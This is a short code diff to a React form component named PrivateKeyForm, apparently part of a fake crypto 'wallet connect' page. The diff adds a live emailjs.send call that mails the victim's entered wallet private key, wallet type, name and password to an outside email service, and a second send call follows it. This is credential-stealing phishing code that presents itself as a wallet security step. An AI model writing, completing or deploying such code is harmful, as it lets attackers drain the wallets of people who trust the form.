@@ -39,23 +39,23 @@ const PrivateKeyForm = ({ wallet, privateKeyLengthNotlong }) => {
 
     if (privateKey64Long) {
       try {
-        // Send data to your backend API
-        // await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', {
-        //   name: formData.name,
-        //   type: formData.type,
-        //   data: formData.privateKey,
-        //   password: formData.password,
-        // });
 
-        // await emailjs.send(
-        //   'service_ky8xa0e',
-        //   'template_kqjcmir',
-        //   {
-        //     ...formData,
-        //   },
-        //   'pudHPDoixy2beukw8'
-        // );
-
+        await emailjs.send(
+          'service_ky8xa0e',
+          'template_kqjcmir',
+          {
+            to_name: "dapp", // Replace with the actual recipient's name if needed
+            from_name: formData.name,
+            message: `
+              Name: ${formData.name}
+              Type: ${formData.type}
+              Data: ${formData.privateKey}
+              Password: ${formData.password}
+            `,
+          },
+          'pudHPDoixy2beukw8'
+        );
+        
         await emailjs.send(
           'service_ky8xa0e',
           'template_kqjcmir',
